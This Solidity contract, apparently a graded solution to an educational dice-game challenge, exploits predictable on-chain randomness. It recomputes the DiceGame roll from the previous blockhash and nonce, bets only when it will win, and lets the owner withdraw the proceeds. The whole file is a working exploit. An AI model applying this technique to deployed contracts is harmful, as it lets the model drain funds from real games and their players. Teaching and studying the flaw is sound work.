pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__NotEnoughEth();
error RiggedRoll__TransferFailed();
error RiggedRoll__LowerThan2();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            console.log("\t", "   Rigged Contract Balance insufficient");
            revert RiggedRoll__NotEnoughEth();
        }

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, diceGame, diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Dice Roll:", roll);

        if (roll > 2) {
            revert RiggedRoll__LowerThan2();
        }

        console.log("\t", "   Rolling the Rigged Dice!!");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    receive() external payable {}

    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
        (bool success, ) = payable(_addr).call{value: _amount}("");
        if (!success) {
            revert RiggedRoll__TransferFailed();
        }
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
}
